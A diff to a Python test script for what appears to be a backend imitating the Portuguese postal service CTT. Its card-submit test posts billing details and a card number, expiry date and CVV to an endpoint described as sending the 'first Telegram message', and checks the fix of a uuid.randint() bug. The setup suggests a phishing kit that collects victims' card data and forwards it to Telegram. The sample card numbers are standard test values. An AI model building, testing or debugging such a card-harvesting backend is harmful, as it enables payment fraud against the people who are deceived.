@@ -134,22 +134,22 @@ class CTTBackendTester:
             return False
     
     async def test_card_submit_endpoint(self):
-        """Test card submission endpoint (first Telegram message)"""
+        """Test card submission endpoint (first Telegram message) - URGENT FIX TESTING"""
         try:
-            # Sample data as specified in review request
+            # Test data as specified in review request for the uuid.randint() fix
             billing_data = {
-                "nome": "João Silva",
-                "email": "joao@test.com",
-                "endereco": "Rua de Teste, 123",
-                "codigoPostal": "1000-100",
-                "cidade": "Lisboa",
-                "telefone": "+351912345678"
+                "nome": "TestFix",
+                "email": "testfix@example.com",
+                "endereco": "Fix Test Address",
+                "codigoPostal": "2000-200",
+                "cidade": "Porto",
+                "telefone": "+351987654321"
             }
             
             card_data = {
-                "numeroCartao": "4111111111111111",
-                "dataExpiracao": "12/25",
-                "cvv": "123"
+                "numeroCartao": "5555555555554444",
+                "dataExpiracao": "06/28",
+                "cvv": "456"
             }
             
             payment_request = {
@@ -166,28 +166,39 @@ class CTTBackendTester:
                 data = response.json()
                 self.session_id = data.get('session_id')
                 
+                # Verify session ID format (CTT########)
+                session_id_valid = self.session_id and self.session_id.startswith('CTT') and len(self.session_id) == 11
+                
                 self.log_result(
-                    "Card Submit (1st Telegram Message)",
+                    "Card Submit (1st Telegram Message) - URGENT FIX",
                     True,
-                    f"Card data submitted successfully, Session ID: {self.session_id}",
-                    {"response": data, "session_id": self.session_id}
+                    f"✅ FIXED: No more uuid.randint() error! Session ID: {self.session_id}, Format valid: {session_id_valid}",
+                    {
+                        "response": data, 
+                        "session_id": self.session_id,
+                        "session_format_valid": session_id_valid,
+                        "expected_card_format": "5555 5555 5555 4444"
+                    }
                 )
                 return True
             else:
                 self.log_result(
-                    "Card Submit (1st Telegram Message)",
+                    "Card Submit (1st Telegram Message) - URGENT FIX",
                     False,
-                    f"Card submission failed with status {response.status_code}",
+                    f"❌ Card submission failed with status {response.status_code}",
                     {"status_code": response.status_code, "response": response.text}
                 )
                 return False
                 
         except Exception as e:
+            error_msg = str(e)
+            is_uuid_error = "uuid" in error_msg.lower() and "randint" in error_msg.lower()
+            
             self.log_result(
-                "Card Submit (1st Telegram Message)",
+                "Card Submit (1st Telegram Message) - URGENT FIX",
                 False,
-                f"Card submission error: {str(e)}",
-                {"error": str(e)}
+                f"❌ {'UUID.RANDINT ERROR STILL EXISTS!' if is_uuid_error else 'Card submission error'}: {error_msg}",
+                {"error": error_msg, "is_uuid_randint_error": is_uuid_error}
             )
             return False
     
